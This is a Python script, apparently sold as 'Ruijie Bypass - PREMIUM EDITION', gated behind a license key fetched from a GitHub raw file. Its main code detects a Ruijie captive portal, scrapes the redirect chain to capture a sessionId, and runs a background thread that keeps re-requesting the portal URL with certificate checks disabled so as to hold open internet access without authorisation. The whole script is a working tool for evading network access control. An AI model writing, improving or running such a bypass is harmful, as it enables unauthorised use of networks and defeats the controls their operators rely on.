import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [Updated Link] ---
RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/bypass-ruijie/refs/heads/main/Key.txt"
LICENSE_FILE = "license.txt"

# Standard Color Codes
Y = "\033[1;33m" # Yellow
G = "\033[1;32m" # Green
R = "\033[1;31m" # Red
W = "\033[1;37m" # White
OFF = "\033[0m"  # Reset

def banner():
    os.system('clear')
    print(Y + " ="*35 + OFF)
    # တစ်ကြောင်းချင်းစီ အရောင်သတ်မှတ်ခြင်း
    print(Y + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗" + OFF)
    print(Y + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝" + OFF)
    print(G + "      ██████╔╝██║   ██║██║     ██║██║█████╗  " + OFF)
    print(G + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  " + OFF)
    print(R + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗" + OFF)
    print(R + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝" + OFF)
    print(f"        {R}✨ Ruijie Bypass - PREMIUM EDITION ✨{OFF}")
    print(Y + " ="*35 + OFF + "\n")

def get_hwid():
    try:
        return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except:
        return "ID-Unknown"

def verify():
    hwid = get_hwid()
    banner()
    if os.path.exists(LICENSE_FILE):
        print(G + "[✓] Status: Active (Auto Login Success)" + OFF)
        return True
    try:
        print(W + "[*] Connecting to License Server..." + OFF)
        resp = requests.get(RAW_KEY_URL, timeout=10).text
        print(W + "[+] DEVICE ID: " + Y + hwid + OFF)
        key = input(Y + "[?] ENTER LICENSE KEY: " + OFF).strip()
        if f"{key}:{hwid}" in resp:
            with open(LICENSE_FILE, "w") as f: f.write(key)
            print(G + "[✓] Access Granted!" + OFF)
            return True
        else:
            print(R + "[!] Invalid Key." + OFF)
            sys.exit()
    except:
        sys.exit()

def high_speed_pulse(link):
    while True:
        try:
            requests.get(link, timeout=10, verify=False)
            print(G + f"[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]      " + OFF, end="\r")
        except: break
        time.sleep(2)

def start_bypass():
    print(W + "[*] Attempting to Capture Portal..." + OFF)
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            # အကယ်၍ internet ရှိနေရင်
            if r.status_code == 204:
                print(Y + "[•] Internet Connected. Monitoring...         " + OFF, end="\r")
                time.sleep(10)
                continue
            
            # Capturing Logic...
            r1 = requests.get(r.url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(r.url, match.group(1)) if match else r.url
            sid = parse_qs(urlparse(requests.get(n_url, verify=False).url).query).get('sessionId', [None])[0]
            
            if sid:
                print(G + f"[✓] SID Captured: {sid[:15]}..." + OFF)
                print(R + "[*] ⚡ Launching Stability Pulse Threads... ⚡" + OFF)
                # Thread စတင်ခြင်း
                threading.Thread(target=high_speed_pulse, args=(n_url,), daemon=True).start()
                while True: time.sleep(10)
        except: time.sleep(5)

if __name__ == "__main__":
    if verify():
        try: start_bypass()
        except: print(R + "\n[!] Stopped." + OFF)
